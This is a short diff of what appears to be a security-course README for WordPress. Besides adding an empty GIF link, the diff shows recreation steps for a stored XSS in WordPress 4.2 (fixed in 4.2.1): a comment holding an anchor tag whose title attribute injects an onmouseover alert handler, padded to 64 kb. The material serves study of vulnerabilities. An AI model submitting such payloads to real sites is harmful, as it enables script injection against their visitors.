@@ -11,7 +11,7 @@ Time spent: **X** hours spent in total
     - Vulnerability types: XSS
     - Tested in version: 4.2
     - Fixed in version: 4.2.1
-  - [ ] GIF Walkthrough: 
+  - [ ] GIF Walkthrough: ![]()
   - [ ] Steps to recreate: Go to the wordpress website (not as admin), view a post and fill in the comment: <a title='x onmouseover=alert(unescape(/hello%20world/.source)) style=position:absolute;left:0;top:0;width:5000px;height:5000px  [64 kb]'></a>
  where [64 kb] is a 64 kb text file. 
   - [ ] Affected source code:
